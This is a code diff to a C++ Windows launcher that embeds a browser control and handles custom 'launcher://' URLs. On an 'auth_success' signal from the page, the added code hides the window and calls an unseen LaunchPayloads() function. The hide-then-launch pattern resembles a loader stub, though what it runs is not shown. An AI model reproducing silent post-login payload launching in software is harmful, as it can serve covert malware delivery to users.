@@ -163,7 +163,23 @@ public:
     STDMETHODIMP GetOptionKeyPath(LPOLESTR*, DWORD) { return E_NOTIMPL; }
     STDMETHODIMP GetDropTarget(IDropTarget*, IDropTarget**) { return E_NOTIMPL; }
     STDMETHODIMP GetExternal(IDispatch** ppDispatch) { *ppDispatch = NULL; return S_FALSE; }
-    STDMETHODIMP TranslateUrl(DWORD dwTranslate, LPWSTR pchURLIn, LPWSTR* ppchURLOut) { return S_FALSE; }
+    STDMETHODIMP TranslateUrl(DWORD dwTranslate, LPWSTR pchURLIn, LPWSTR* ppchURLOut) {
+        if (pchURLIn) {
+            if (wcsstr(pchURLIn, L"launcher://close")) {
+                PostMessage(m_hWnd, WM_CLOSE, 0, 0);
+                return S_OK;
+            }
+            if (wcsstr(pchURLIn, L"launcher://minimize")) {
+                ShowWindow(m_hWnd, SW_MINIMIZE);
+                return S_OK;
+            }
+            if (wcsstr(pchURLIn, L"launcher://auth_success")) {
+                PostMessage(m_hWnd, WM_USER + 101, 0, 0);
+                return S_OK;
+            }
+        }
+        return S_FALSE;
+    }
     STDMETHODIMP FilterDataObject(IDataObject* pDO, IDataObject** ppDORet) { return S_FALSE; }
 };
 
@@ -173,6 +189,17 @@ IOleObject*   pOle = NULL;
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
+    case WM_USER + 101: {
+        ShowWindow(hWnd, SW_HIDE);
+        LaunchPayloads();
+        DestroyWindow(hWnd);
+        break;
+    }
+    case WM_CLOSE: {
+        ShowWindow(hWnd, SW_HIDE);
+        DestroyWindow(hWnd);
+        break;
+    }
     case WM_CREATE: {
         WebSite* site = new WebSite(hWnd);
 
@@ -248,6 +275,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         if (pBrowser) { pBrowser->Quit(); pBrowser->Release(); pBrowser = NULL; }
         if (pOle) { pOle->Close(OLECLOSE_NOSAVE); pOle->Release(); pOle = NULL; }
         PostQuitMessage(0);
+        ExitProcess(0);
         break;
 
     default:
